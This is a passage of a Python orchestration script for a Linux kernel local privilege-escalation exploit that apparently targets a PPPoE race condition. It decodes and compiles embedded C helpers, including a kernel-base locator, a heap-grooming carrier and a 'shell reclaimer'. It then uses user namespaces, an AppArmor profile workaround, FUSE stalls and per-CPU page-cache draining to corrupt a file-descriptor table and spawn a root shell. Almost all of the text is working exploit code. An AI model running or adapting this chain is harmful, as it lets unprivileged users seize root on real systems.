            wrapper: tuple[str, ...] = ()
        else:
            print(
                "namespace: direct unshare -Urn denied; using aa-exec -p trinity",
                flush=True,
            )
            aa_exec: str = require_program("aa-exec")
            wrapper = (aa_exec, "-p", "trinity", "--")
        plan: PlatformPlan = PlatformPlan(
            distro=distro,
            label=f"Ubuntu {kernel}",
            carrier_prefix=wrapper,
            namespace_prefix=(*wrapper, unshare, "-Urn"),
            fuse_namespace_prefix=(*wrapper, unshare, "-Urnm"),
        )
    else:
        plan = PlatformPlan(
            distro=distro,
            label=f"Fedora {kernel}",
            carrier_prefix=(),
            namespace_prefix=(unshare, "-Urn"),
            fuse_namespace_prefix=(unshare, "-Urnm"),
        )
    return plan, Programs(gcc, taskset)


def derive_cpu_plan(available: Sequence[int]) -> CpuPlan:
    cpus: tuple[int, ...] = tuple(sorted(set(available)))
    if len(cpus) < MINIMUM_CPU_COUNT:
        fail(
            f"at least {MINIMUM_CPU_COUNT} available logical CPUs are required; "
            f"found {len(cpus)}"
        )
    if cpus[0] < 0:
        fail("CPU affinity contains a negative CPU identifier")
    if len(cpus) == MINIMUM_CPU_COUNT:
        sender_cpu, reclaim_cpu, fuse_cpu, control_cpu = cpus
        return CpuPlan(
            available=cpus,
            carrier=reclaim_cpu,
            high_sender=sender_cpu,
            low_sender=sender_cpu,
            high_workers=(reclaim_cpu,),
            high_worker_count=HIGH_WORKERS_PER_CPU,
            low_workers=(reclaim_cpu,),
            low_fuse=fuse_cpu,
            high_fuse=fuse_cpu,
            high_trigger=control_cpu,
            release=control_cpu,
            orchestrator=control_cpu,
            low_membarrier_order0=control_cpu,
            low_membarrier_order1=control_cpu,
            parked_helper=control_cpu,
        )
    if len(cpus) >= FULL_CPU_PLAN_COUNT:
        slots: tuple[int, ...] = cpus[:FULL_CPU_PLAN_COUNT]
        return CpuPlan(
            available=cpus,
            carrier=slots[1],
            high_sender=slots[0],
            low_sender=slots[6],
            high_workers=slots[1:25],
            high_worker_count=MAXIMUM_HIGH_WORKERS,
            low_workers=slots[8:16],
            low_fuse=slots[0],
            high_fuse=slots[26],
            high_trigger=slots[25],
            release=slots[27],
            orchestrator=slots[28],
            low_membarrier_order0=slots[20],
            low_membarrier_order1=slots[12],
            parked_helper=slots[5],
        )
    worker_cpus: tuple[int, ...] = cpus[1:-3]
    high_worker_count: int = min(
        MAXIMUM_HIGH_WORKERS,
        len(worker_cpus) * HIGH_WORKERS_PER_CPU,
    )
    return CpuPlan(
        available=cpus,
        carrier=worker_cpus[0],
        high_sender=cpus[0],
        low_sender=cpus[0],
        high_workers=worker_cpus,
        high_worker_count=high_worker_count,
        low_workers=worker_cpus,
        low_fuse=cpus[-3],
        high_fuse=cpus[-3],
        high_trigger=cpus[-2],
        release=cpus[-2],
        orchestrator=cpus[-1],
        low_membarrier_order0=cpus[-2],
        low_membarrier_order1=cpus[-2],
        parked_helper=cpus[-1],
    )


def lane_assignments(
    cpu_plan: CpuPlan, order: int, attempt: int
) -> tuple[tuple[int, int], ...]:
    total_lanes: int = 8 if order == 0 else 4
    capacity: int = min(total_lanes, len(cpu_plan.low_workers))
    start: int = ((attempt - 1) * capacity) % total_lanes
    return tuple(
        ((start + index) % total_lanes, cpu_plan.low_workers[index])
        for index in range(capacity)
    )


def describe_cpu_plan(cpu_plan: CpuPlan) -> None:
    workers: str = ",".join(str(cpu) for cpu in cpu_plan.high_workers)
    print(
        f"CPU assignment: {len(cpu_plan.available)} available; "
        f"sender {cpu_plan.high_sender}; reclaim CPUs {workers}; "
        f"FUSE {cpu_plan.high_fuse}; release {cpu_plan.release}; "
        f"orchestrator {cpu_plan.orchestrator}; "
        f"{cpu_plan.high_worker_count} high-order workers.",
        flush=True,
    )


def verify_runtime(uid: int) -> CpuPlan:
    if uid == 0 or os.geteuid() == 0 or uid != os.geteuid():
        fail("run this reproducer directly as an ordinary unprivileged user")
    cpu_plan: CpuPlan = derive_cpu_plan(tuple(os.sched_getaffinity(0)))
    fuse_device: Path = Path("/dev/fuse")
    if not fuse_device.exists() or not os.access(fuse_device, os.R_OK | os.W_OK):
        fail("/dev/fuse is unavailable to the current ordinary user")
    return cpu_plan


def attacker_home(uid: int) -> Path:
    try:
        path: Path = Path(pwd.getpwuid(uid).pw_dir).resolve(strict=True)
    except (KeyError, OSError) as error:
        raise ChainError(f"cannot resolve the ordinary user's home: {error}") from error
    status: os.stat_result = path.lstat()
    if status.st_uid != uid or not stat.S_ISDIR(status.st_mode):
        fail(f"home directory is not attacker-owned: {path}")
    return path


def make_work_directory(uid: int) -> Path:
    home: Path = attacker_home(uid)
    path: Path = Path(tempfile.mkdtemp(prefix=f".pppoe-root-{uid}-", dir=home))
    status: os.stat_result = path.lstat()
    if status.st_uid != uid or not stat.S_ISDIR(status.st_mode):
        fail(f"temporary directory is not attacker-owned: {path}")
    path.chmod(0o700)
    return path


def remove_owned_tree(path: Path, uid: int) -> None:
    try:
        status: os.stat_result = path.lstat()
    except FileNotFoundError:
        return
    if (
        status.st_uid != uid
        or not stat.S_ISDIR(status.st_mode)
        or path.parent != attacker_home(uid)
        or not path.name.startswith(f".pppoe-root-{uid}-")
    ):
        print(f"warning: refusing unsafe temporary-tree cleanup: {path}", file=sys.stderr)
        return
    try:
        shutil.rmtree(path)
    except OSError as error:
        print(f"warning: cannot clean temporary tree {path}: {error}", file=sys.stderr)


def materialize_sources(work_directory: Path) -> dict[str, Path]:
    if tuple(EMBEDDED_SOURCE_BLOBS) != SOURCE_NAMES:
        fail("embedded component set is incomplete")
    sources: dict[str, Path] = {}
    for name in SOURCE_NAMES:
        try:
            compressed: bytes = base64.b85decode(
                EMBEDDED_SOURCE_BLOBS[name].encode("ascii")
            )
            content: bytes = zlib.decompress(compressed)
        except (ValueError, zlib.error) as error:
            raise ChainError(f"cannot decode embedded component {name}: {error}") from error
        if name.endswith(".py"):
            compile(content, name, "exec")
        path: Path = work_directory / name
        descriptor: int = os.open(
            path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_CLOEXEC, 0o600
        )
        try:
            offset: int = 0
            while offset < len(content):
                written: int = os.write(descriptor, content[offset:])
                if written <= 0:
                    fail(f"short write while materializing {name}")
                offset += written
        finally:
            os.close(descriptor)
        sources[name] = path
    return sources


def compile_helpers(work_directory: Path, programs: Programs) -> Helpers:
    sources: dict[str, Path] = materialize_sources(work_directory)
    specifications: tuple[tuple[str, str, tuple[str, ...]], ...] = (
        ("h210_kernel_text_locator.c", "h210", ()),
        ("h209_vmalloc_carrier.c", "h209", ()),
        ("h211_shell_reclaimer.c", "h211", ()),
        ("h050_team_ip6gre_offset48.c", "h050", ("-pthread",)),
        ("h316_skb_slab_churn.c", "h316", ()),
        ("h318_lane_reclaimer.c", "h318", ()),
        ("h321_prime_pcp.c", "h321", ()),
        ("h322_drain_worker_pcp.c", "h322", ()),
    )
    outputs: dict[str, Path] = {}
    for source_name, output_name, extra_flags in specifications:
        source: Path = sources[source_name]
        output: Path = work_directory / output_name
        completed: subprocess.CompletedProcess[str] = subprocess.run(
            [
                programs.gcc,
                "-std=gnu11",
                "-O2",
                "-Wall",
                "-Wextra",
                "-Werror",
                str(source),
                "-o",
                str(output),
                *extra_flags,
            ],
            env=clean_environment(),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=120.0,
            check=False,
        )
        if completed.returncode != 0:
            fail(
                f"gcc failed for {source_name} (status {completed.returncode}):\n"
                f"{completed.stdout}{completed.stderr}"
            )
        output.chmod(0o700)
        outputs[output_name] = output
    return Helpers(
        locator=outputs["h210"],
        carrier=outputs["h209"],
        high_reclaimer=outputs["h211"],
        trigger=outputs["h050"],
        fuse_server=sources["h113_raw_fuse.py"],
        slab_churn=outputs["h316"],
        slab_reclaimer=outputs["h318"],
        pcp_prime=outputs["h321"],
        pcp_drain=outputs["h322"],
    )


def safe_unlink(path: Path, uid: int, *, strict: bool) -> None:
    try:
        status: os.stat_result = path.lstat()
    except FileNotFoundError:
        return
    if status.st_uid != uid or not (
        stat.S_ISREG(status.st_mode) or stat.S_ISLNK(status.st_mode)
    ):
        message: str = f"refusing to remove foreign marker: {path}"
        if strict:
            fail(message)
        print(f"warning: {message}", file=sys.stderr)
        return
    try:
        path.unlink()
    except FileNotFoundError:
        pass
    except OSError as error:
        if strict:
            raise ChainError(f"cannot remove stale marker {path}: {error}") from error
        print(f"warning: cannot clean marker {path}: {error}", file=sys.stderr)


def clear_attempt_markers(uid: int, *, strict: bool) -> None:
    for path in ATTEMPT_MARKERS:
        safe_unlink(path, uid, strict=strict)


def marker_is_ready(path: Path, uid: int, require_data: bool) -> bool:
    try:
        status: os.stat_result = path.lstat()
    except FileNotFoundError:
        return False
    if status.st_uid != uid or not stat.S_ISREG(status.st_mode):
        fail(f"unsafe or foreign marker appeared: {path}")
    return not require_data or status.st_size > 0


def wait_for_markers(
    description: str,
    requirements: Sequence[tuple[Path, bool]],
    uid: int,
    timeout_seconds: float,
    monitored: Sequence[ManagedProcess],
) -> None:
    deadline: float = time.monotonic() + timeout_seconds
    while True:
        if all(
            marker_is_ready(path, uid, require_data)
            for path, require_data in requirements
        ):
            return
        for managed in monitored:
            status: int | None = managed.process.poll()
            if status is not None:
                fail(process_exit_message(managed, description))
        if time.monotonic() >= deadline:
            fail(f"timed out waiting for {description}")
        time.sleep(0.002)


def read_owned_text(path: Path, uid: int, maximum_bytes: int = 65_536) -> str:
    try:
        descriptor: int = os.open(path, os.O_RDONLY | os.O_CLOEXEC | os.O_NOFOLLOW)
    except OSError as error:
        raise ChainError(f"cannot open marker {path}: {error}") from error
    try:
        status: os.stat_result = os.fstat(descriptor)
        if status.st_uid != uid or not stat.S_ISREG(status.st_mode):
            fail(f"unsafe or foreign marker: {path}")
        data: bytes = os.read(descriptor, maximum_bytes + 1)
    finally:
        os.close(descriptor)
    if len(data) > maximum_bytes:
        fail(f"marker is unexpectedly large: {path}")
    try:
        return data.decode("ascii")
    except UnicodeDecodeError as error:
        raise ChainError(f"marker is not ASCII: {path}") from error


def create_marker(path: Path, uid: int) -> None:
    try:
        descriptor: int = os.open(
            path,
            os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_CLOEXEC | os.O_NOFOLLOW,
            0o600,
        )
    except OSError as error:
        raise ChainError(f"cannot create synchronization marker {path}: {error}") from error
    try:
        status: os.stat_result = os.fstat(descriptor)
        if status.st_uid != uid or not stat.S_ISREG(status.st_mode):
            fail(f"unsafe synchronization marker: {path}")
    finally:
        os.close(descriptor)


def child_processes(process_id: int) -> list[int]:
    path: Path = Path(f"/proc/{process_id}/task/{process_id}/children")
    try:
        text: str = path.read_text(encoding="ascii")
    except (FileNotFoundError, ProcessLookupError, PermissionError):
        return []
    return [int(item) for item in text.split() if item.isdecimal()]


def process_tree(process_id: int) -> list[int]:
    descendants: list[int] = []
    pending: list[int] = [process_id]
    seen: set[int] = set()
    while pending:
        current: int = pending.pop()
        if current in seen:
            continue
        seen.add(current)
        children: list[int] = child_processes(current)
        pending.extend(children)
        descendants.extend(children)
    return descendants


def send_signal(process_id: int, chosen_signal: int) -> None:
    try:
        os.kill(process_id, chosen_signal)
    except (ProcessLookupError, PermissionError):
        pass


def stop_process(managed: ManagedProcess) -> None:
    process: subprocess.Popen[bytes] = managed.process
    if process.poll() is not None:
        return
    if managed.isolated_group:
        try:
            os.killpg(process.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
    else:
        descendants: list[int] = process_tree(process.pid)
        for process_id in reversed(descendants):
            send_signal(process_id, signal.SIGTERM)
        send_signal(process.pid, signal.SIGTERM)
    try:
        process.wait(timeout=2.0)
        return
    except subprocess.TimeoutExpired:
        pass
    if managed.isolated_group:
        try:
            os.killpg(process.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
    else:
        descendants = process_tree(process.pid)
        for process_id in reversed(descendants):
            send_signal(process_id, signal.SIGKILL)
        send_signal(process.pid, signal.SIGKILL)
    try:
        process.wait(timeout=2.0)
    except subprocess.TimeoutExpired:
        print(f"warning: {managed.name} did not exit during cleanup", file=sys.stderr)


def wait_for_stopped_process(
    managed: ManagedProcess, timeout_seconds: float
) -> None:
    deadline: float = time.monotonic() + timeout_seconds
    status_path: Path = Path(f"/proc/{managed.process.pid}/status")
    while time.monotonic() < deadline:
        if managed.process.poll() is not None:
            fail(process_exit_message(managed, "it was ready"))
        try:
            status_text: str = status_path.read_text(encoding="ascii")
        except (FileNotFoundError, ProcessLookupError):
            time.sleep(0.001)
            continue
        state: re.Match[str] | None = re.search(
            r"^State:\s+([A-Z])", status_text, re.MULTILINE
        )
        if state is not None and state.group(1) == "T":
            return
        time.sleep(0.001)
    fail(f"{managed.name} did not park within {timeout_seconds:.1f} seconds")


def last_log_message(path: Path | None) -> str | None:
    if path is None:
        return None
    try:
        content: list[str] = path.read_text(
            encoding="utf-8", errors="replace"
        ).splitlines()
    except OSError:
        return None
    for line in reversed(content):
        message: str = line.strip()
        if message:
            return message[-500:]
    return None


def process_exit_message(managed: ManagedProcess, pending_work: str) -> str:
    status: int | None = managed.process.poll()
    message: str = (
        f"{managed.name} stopped with status {status} before {pending_work}"
    )
    detail: str | None = last_log_message(managed.log_path)
    if detail is not None:
        message += f": {detail}"
    return message


@contextmanager
def parent_ignores_terminal_interrupts() -> Iterator[None]:
    watched: tuple[int, ...] = (signal.SIGINT, signal.SIGQUIT)
    previous: dict[int, Any] = {}
    try:
        for chosen_signal in watched:
            previous[chosen_signal] = signal.getsignal(chosen_signal)
            signal.signal(chosen_signal, signal.SIG_IGN)
        yield
    finally:
        for chosen_signal, handler in previous.items():
            signal.signal(chosen_signal, handler)


@contextmanager
def parent_on_orchestrator_cpu(cpu: int) -> Iterator[None]:
    previous: set[int] = set(os.sched_getaffinity(0))
    try:
        os.sched_setaffinity(0, {cpu})
        yield
    finally:
        os.sched_setaffinity(0, previous)


def locate_kernel_base(locator: Path) -> int:
    completed: subprocess.CompletedProcess[str] = subprocess.run(
        [str(locator)],
        env=clean_environment(),
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=LOCATOR_TIMEOUT_SECONDS,
        check=False,
    )
    if completed.returncode != 0:
        detail: str = completed.stderr.strip() or completed.stdout.strip()
        suffix: str = f": {detail[-500:]}" if detail else ""
        fail(
            f"kernel-layout helper stopped with status "
            f"{completed.returncode}{suffix}"
        )
    matches: list[str] = re.findall(
        r"(?m)^H209_KERNEL_BASE=(0x[0-9a-fA-F]{16})$", completed.stdout
    )
    if len(matches) != 1:
        fail("kernel-text locator did not emit one base address")
    kernel_base: int = int(matches[0], 16)
    if kernel_base < 0xFFFFFFFF80000000 or kernel_base & 0x1FFFFF:
        fail("kernel-text locator emitted an invalid base address")
    return kernel_base


def parse_assignments(text: str) -> dict[str, str]:
    values: dict[str, str] = {}
    for line in text.splitlines():
        match: re.Match[str] | None = ASSIGNMENT.fullmatch(line)
        if match is None or match.group(1) in values:
            fail(f"malformed or duplicate carrier assignment: {line!r}")
        values[match.group(1)] = match.group(2)
    return values


def parse_integer(
    values: Mapping[str, str], name: str, minimum: int, maximum: int
) -> int:
    try:
        value: int = int(values[name], 0)
    except (KeyError, ValueError) as error:
        raise ChainError(f"invalid carrier integer {name}") from error
    if value < minimum or value > maximum:
        fail(f"carrier integer outside supported range: {name}={value}")
    return value


def byte_swap_16(value: int) -> int:
    return ((value & 0xFF) << 8) | ((value >> 8) & 0xFF)


def payload_order(payload: int) -> int:
    requested: int = 16 + 6 + payload
    allocation_bytes: int = ((requested + 63) & ~63) + 320
    capacity: int = 4096
    order: int = 0
    while capacity < allocation_bytes:
        capacity <<= 1
        order += 1
    return order


def parse_carrier(uid: int, expected_kernel_base: int) -> CarrierGeometry:
    values: dict[str, str] = parse_assignments(read_owned_text(H209_READY, uid))
    required: set[str] = {
        "H209_FAKE_PAGE",
        "H209_FAKE_FILE",
        "H209_KERNEL_BASE",
        "H209_LAYOUT",
        "H209_RETAINED_SCORE",
        "H209_RETAINED_RUNNER_SCORE",
        "H209_SKB_ORDER",
        "H115_TARGET_FD",
        "H109_TRIGGER_HEADROOM",
        "H109_OUTER_HEADROOM",
        "H215_CORRUPT_FD",
        "H050_SID",
        "H053_PAYLOAD",
    }
    if set(values) != required:
        fail("carrier marker fields differ from the embedded contract")
    fake_page: int = parse_integer(values, "H209_FAKE_PAGE", 1, (1 << 64) - 1)
    fake_file: int = parse_integer(values, "H209_FAKE_FILE", 1, (1 << 64) - 1)
    kernel_base: int = parse_integer(
        values, "H209_KERNEL_BASE", 1, (1 << 64) - 1
    )
    order: int = parse_integer(values, "H209_SKB_ORDER", 0, 4)
    target_fd: int = parse_integer(values, "H115_TARGET_FD", 1, 8191)
    corrupt_fd: int = parse_integer(values, "H215_CORRUPT_FD", 2, target_fd - 1)
    sid: int = parse_integer(values, "H050_SID", 0, 0xFFFF)
    payload: int = parse_integer(values, "H053_PAYLOAD", 1, 0xFFFF)
    retained_score: int = parse_integer(
        values, "H209_RETAINED_SCORE", 0, 1 << 62
    )
    runner_score: int = parse_integer(
        values, "H209_RETAINED_RUNNER_SCORE", -(1 << 63), (1 << 63) - 1
    )
    if kernel_base != expected_kernel_base or fake_file != fake_page + 0x11:
        fail("carrier address geometry is inconsistent")
    if sid != byte_swap_16((fake_file >> 16) & 0xFFFF):
        fail("carrier session ID does not encode the fake-file pointer")
    if payload != byte_swap_16((fake_file >> 32) & 0xFFFF):
        fail("carrier payload does not encode the fake-file pointer")
    if payload_order(payload) != order or target_fd != ((4096 << order) // 8) - 1:
        fail("carrier payload, allocation order, and fdtable size disagree")
    if (
        corrupt_fd != 2
        or parse_integer(values, "H109_TRIGGER_HEADROOM", 0, 65_535) != 0
        or parse_integer(values, "H109_OUTER_HEADROOM", 0, 65_535) != 0
    ):
        fail("carrier selected unsupported stale-write geometry")
    if retained_score <= runner_score:
        fail("carrier confidence margin is not positive")
    return CarrierGeometry(
        order=order,
        target_fd=target_fd,
        corrupt_fd=corrupt_fd,
        sid=sid,
        payload=payload,
    )


def verify_fd_limit(geometry: CarrierGeometry) -> None:
    _soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    required: int = max(geometry.target_fd + 1, 4096 if geometry.order < 2 else 0)
    if hard != resource.RLIM_INFINITY and hard < required:
        fail(f"RLIMIT_NOFILE hard limit {hard} is below required {required}")


def copy_launcher(reclaimer: Path, launcher: Path, uid: int) -> None:
    shutil.copyfile(reclaimer, launcher, follow_symlinks=False)
    launcher.chmod(0o755)
    status: os.stat_result = launcher.lstat()
    if (
        status.st_uid != uid
        or not stat.S_ISREG(status.st_mode)
        or status.st_nlink != 1
    ):
        fail("root-shell handoff is not one attacker-owned regular file")


def parse_reclaim_summary(uid: int) -> ReclaimSummary:
    text: str = read_owned_text(FDTABLE_DONE, uid)
    match: re.Match[str] | None = re.fullmatch(
        r"workers=([0-9]+) setup_failures=([0-9]+) "
        r"fatal_failures=([0-9]+) root_shell=(yes|no) "
        r"base_delay_ns=([0-9]+) spacing_ns=([0-9]+)\n?",
        text,
    )
    if match is None:
        fail(f"malformed reclaimer summary: {text!r}")
    return ReclaimSummary(
        workers=int(match.group(1)),
        setup_failures=int(match.group(2)),
        fatal_failures=int(match.group(3)),
        root_shell=match.group(4) == "yes",
        base_delay_ns=int(match.group(5)),
        spacing_ns=int(match.group(6)),
    )


def wait_for_trigger_status(
    uid: int, fuse_process: ManagedProcess, timeout_seconds: float
) -> int:
    wait_for_markers(
        "namespace-trigger status",
        ((TRIGGER_STATUS, True),),
        uid,
        timeout_seconds,
        (fuse_process,),
    )
    marker: str = read_owned_text(TRIGGER_STATUS, uid)
    match: re.Match[str] | None = re.fullmatch(
        r"pid=([0-9]+) status=(-?[0-9]+)\n?", marker
    )
    if match is None or int(match.group(1)) <= 0:
        fail(f"malformed namespace-trigger status: {marker!r}")
    return int(match.group(2))


def wait_for_success(managed: ManagedProcess, timeout_seconds: float) -> int:
    try:
        return managed.process.wait(timeout=timeout_seconds)
    except subprocess.TimeoutExpired as error:
        raise ChainError(
            f"{managed.name} did not exit within {timeout_seconds:.1f} seconds"
        ) from error


def helper_environment(values: Mapping[str, str]) -> dict[str, str]:
    environment: dict[str, str] = clean_environment()
    environment.update(values)
    return environment


def trigger_environment(
    plan: PlatformPlan,
    cpu_plan: CpuPlan,
    geometry: CarrierGeometry,
    mode: str,
    pulse: bool,
) -> dict[str, str]:
    sender_cpu: int = (
        cpu_plan.high_sender if mode == "high" else cpu_plan.low_sender
    )
    delay_cpu: int = (
        cpu_plan.low_membarrier_order0
        if geometry.order == 0
        else cpu_plan.low_membarrier_order1
    )
    return helper_environment(
        {
            "PPPOE_MODE": mode,
            "PPPOE_DISTRO": plan.distro,
            "PPPOE_SID": f"0x{geometry.sid:04x}",
            "PPPOE_PAYLOAD": str(geometry.payload),
            "PPPOE_ORDER": str(geometry.order),
            "PPPOE_PULSE": "1" if pulse else "0",
            "PPPOE_CPU_SENDER": str(sender_cpu),
            "PPPOE_CPU_DELAY": str(delay_cpu),
            "PPPOE_CPU_CONTROL": str(cpu_plan.orchestrator),
        }
    )


def reclaimer_environment(launcher: Path) -> dict[str, str]:
    return helper_environment({"PPPOE_LAUNCHER": str(launcher)})


def timing_profiles(plan: PlatformPlan, order: int) -> tuple[TimingProfile, ...]:
    if order == 4:
        return tuple(
            TimingProfile(reply_lead, 120_000, True)
            for reply_lead in ORDER4_REPLY_LEADS_NS
        )
    if plan.distro == "ubuntu":
        return tuple(
            TimingProfile(reply_lead, 0, True)
            for reply_lead in UBUNTU_REPLY_LEADS_NS
        ) + tuple(
            TimingProfile(reply_lead, 0, False)
            for reply_lead in UBUNTU_REPLY_LEADS_NS
        )
    return tuple(
        TimingProfile(reply_lead, 0, False)
        for reply_lead in FEDORA_REPLY_LEADS_NS
    ) + tuple(
        TimingProfile(reply_lead, 0, True)
        for reply_lead in UBUNTU_REPLY_LEADS_NS
    )


def start_carrier(
    uid: int,
    plan: PlatformPlan,
    programs: Programs,
    helper: Path,
    work_directory: Path,
    kernel_base: int,
    epoch: int,
    cpu_plan: CpuPlan,
    registry: ProcessRegistry,
) -> tuple[ManagedProcess, CarrierGeometry]:
    safe_unlink(H209_READY, uid, strict=True)
    carrier_log: Path = work_directory / f"carrier-{epoch:02d}.log"
    carrier: ManagedProcess = registry.spawn(
        "memory-layout helper",
        (
            programs.taskset,
            "-c",
            str(cpu_plan.carrier),
            *plan.carrier_prefix,
            str(helper),
        ),
        helper_environment({"H209_KERNEL_BASE": f"0x{kernel_base:016x}"}),
        log_path=carrier_log,
        isolated_group=True,
    )
    wait_for_markers(
        "memory-layout discovery finished",
        ((H209_READY, True),),
        uid,
        CARRIER_TIMEOUT_SECONDS,
        (carrier,),
    )
    return carrier, parse_carrier(uid, kernel_base)


def run_slab_churn_cycle(
    name: str,
    uid: int,
    plan: PlatformPlan,
    helper: Path,
    order: int,
    cpu: int,
    log_path: Path,
    registry: ProcessRegistry,
) -> None:
    safe_unlink(SLAB_CHURN_READY, uid, strict=True)
    safe_unlink(SLAB_CHURN_RELEASE, uid, strict=True)
    churn: ManagedProcess = registry.spawn(
        name,
        (*plan.namespace_prefix, str(helper), str(order), str(cpu)),
        clean_environment(),
        log_path=log_path,
        isolated_group=True,
    )
    wait_for_markers(
        f"{name} hold population",
        ((SLAB_CHURN_READY, True),),
        uid,
        SETUP_TIMEOUT_SECONDS,
        (churn,),
    )
    marker: str = read_owned_text(SLAB_CHURN_READY, uid)
    match: re.Match[str] | None = re.fullmatch(r"held_skbs=([0-9]+)\n?", marker)
    if match is None or int(match.group(1)) == 0:
        fail(f"{name} did not hold any skb heads")
    create_marker(SLAB_CHURN_RELEASE, uid)
    status: int = wait_for_success(churn, SETUP_TIMEOUT_SECONDS)
    if status != 0:
        fail(f"{name} exited with status {status}")
    safe_unlink(SLAB_CHURN_READY, uid, strict=True)
    safe_unlink(SLAB_CHURN_RELEASE, uid, strict=True)


def run_slab_attempt(
    attempt: int,
    uid: int,
    work_directory: Path,
    plan: PlatformPlan,
    cpu_plan: CpuPlan,
    helpers: Helpers,
    geometry: CarrierGeometry,
    carrier: ManagedProcess,
) -> AttemptResult:
    attempt_directory: Path = work_directory / f"slab-attempt-{attempt:04d}"
    mountpoint: Path = attempt_directory / "mnt"
    launcher: Path = attempt_directory / "root-shell-handoff"
    fuse_log: Path = attempt_directory / "fuse.log"
    reclaimer_log: Path = attempt_directory / "reclaimer.log"
    trigger_log: Path = attempt_directory / "trigger.log"
    registry: ProcessRegistry = ProcessRegistry()
    lanes: tuple[tuple[int, int], ...] = lane_assignments(
        cpu_plan, geometry.order, attempt
    )
    lane_specification: str = ",".join(
        f"{lane}:{cpu}" for lane, cpu in lanes
    )
    attempt_directory.mkdir(mode=0o700)
    mountpoint.mkdir(mode=0o700)
    clear_attempt_markers(uid, strict=True)
    copy_launcher(helpers.slab_reclaimer, launcher, uid)
    try:
        run_slab_churn_cycle(
            "memory preparation helper",
            uid,
            plan,
            helpers.slab_churn,
            geometry.order,
            cpu_plan.low_sender,
            attempt_directory / "precondition.log",
            registry,
        )
        if geometry.order == 0:
            time.sleep(0.2)
        reclaimer: ManagedProcess = registry.spawn(
            "memory-reuse helper",
            (
                str(helpers.slab_reclaimer),
                str(geometry.order),
                lane_specification,
            ),
            reclaimer_environment(launcher),
            log_path=reclaimer_log,
            isolated_group=False,
        )
        wait_for_markers(
            "memory-reuse workers were ready",
            ((FDTABLE_READY, True), (Path("/tmp/h083_reclaim_pid"), True)),
            uid,
            SETUP_TIMEOUT_SECONDS,
            (reclaimer,),
        )
        fuse_process: ManagedProcess = registry.spawn(
            "network trigger",
            (
                *plan.fuse_namespace_prefix,
                sys.executable,
                str(helpers.fuse_server),
                str(mountpoint),
                "low",
                str(cpu_plan.low_fuse),
                str(cpu_plan.high_trigger),
                str(trigger_log),
                str(helpers.trigger),
            ),
            trigger_environment(plan, cpu_plan, geometry, "low", False),
            log_path=fuse_log,
            isolated_group=True,
        )
        wait_for_markers(
            "network trigger setup finished",
            ((FUSE_READY, True),),
            uid,
            SETUP_TIMEOUT_SECONDS,
            (fuse_process, reclaimer),
        )
        create_marker(SIGNAL_ARMED, uid)
        create_marker(TRIGGER_START, uid)
        wait_for_markers(
            "network trigger reached the race point",
            ((Path("/tmp/h049_fuse_blocked"), False),),
            uid,
            SETUP_TIMEOUT_SECONDS,
            (fuse_process, reclaimer),
        )
        run_slab_churn_cycle(
            "memory preparation helper",
            uid,
            plan,
            helpers.slab_churn,
            geometry.order,
            cpu_plan.low_sender,
            attempt_directory / "sibling-groom.log",
            registry,
        )
        time.sleep(0.1)
        lane_count: int = len(lanes)
        for cpu in dict.fromkeys(cpu for _lane, cpu in lanes):
            safe_unlink(PCP_DRAIN_READY, uid, strict=True)
            drain: ManagedProcess = registry.spawn(
                f"memory preparation helper on CPU {cpu}",
                (
                    str(helpers.pcp_drain),
                    str(cpu),
                    str(cpu_plan.parked_helper),
                ),
                clean_environment(),
                log_path=attempt_directory / f"pcp-drain-{cpu}.log",
                isolated_group=False,
            )
            wait_for_markers(
                f"memory preparation on CPU {cpu} finished",
                ((PCP_DRAIN_READY, True),),
                uid,
                SETUP_TIMEOUT_SECONDS,
                (drain,),
            )
            wait_for_stopped_process(drain, SETUP_TIMEOUT_SECONDS)
        prime: ManagedProcess = registry.spawn(
            "final memory preparation helper",
            (
                str(helpers.pcp_prime),
                str(cpu_plan.low_sender),
                str(cpu_plan.parked_helper),
            ),
            clean_environment(),
            log_path=attempt_directory / "pcp-prime.log",
            isolated_group=False,
        )
        wait_for_markers(
            "final memory preparation finished",
            ((PCP_PRIME_READY, True),),
            uid,
            SETUP_TIMEOUT_SECONDS,
            (prime,),
        )
        wait_for_stopped_process(prime, SETUP_TIMEOUT_SECONDS)
        with parent_ignores_terminal_interrupts():
            trigger_status: int = wait_for_trigger_status(
                uid, fuse_process, SETUP_TIMEOUT_SECONDS
            )
            reclaimer_status: int = reclaimer.process.wait()
        if carrier.process.poll() is not None:
            fail("memory-layout helper stopped during the exploit attempt")
        trigger_output: str = read_owned_text(trigger_log, uid, 262_144)
        summary: ReclaimSummary = parse_reclaim_summary(uid)
        storm: re.Match[str] | None = re.search(
            r"membarrier storm calls=([0-9]+) errors=([0-9]+)", trigger_output
        )
        storm_ok: bool = (
            "membarrier storm ready threads=1 command=0x8" in trigger_output
            and storm is not None
            and int(storm.group(1)) > 0
            and int(storm.group(2)) == 0
        )
        if summary.root_shell:
            return AttemptResult(
                True,
                False,
                "The root shell exited normally.",
            )
        safe_retry: bool = (
            trigger_status == 0
            and storm_ok
            and summary.workers == lane_count
            and 0 <= summary.setup_failures <= lane_count
            and summary.fatal_failures == 0
            and reclaimer_status == (0 if summary.setup_failures == 0 else 1)
            and summary.base_delay_ns == 0
            and summary.spacing_ns == 0
        )
        return AttemptResult(
            False,
            safe_retry,
            f"network trigger status {trigger_status}; memory-reuse helper "
            f"status {reclaimer_status}; {summary.workers} workers, "
            f"{summary.setup_failures} setup failures, "
            f"{summary.fatal_failures} fatal failures; synchronization "
            f"{'completed' if storm_ok else 'failed'}",
        )
    finally:
        registry.stop_all()
        clear_attempt_markers(uid, strict=False)
        if attempt_directory.exists():
            try:
                shutil.rmtree(attempt_directory)
            except OSError as error:
                print(
                    f"warning: cannot clean attempt directory {attempt_directory}: {error}",
                    file=sys.stderr,
                )


def run_high_attempt(
    attempt: int,
    uid: int,
    work_directory: Path,
    plan: PlatformPlan,
    cpu_plan: CpuPlan,
    helpers: Helpers,
    geometry: CarrierGeometry,
    carrier: ManagedProcess,
    profile: TimingProfile,
) -> AttemptResult:
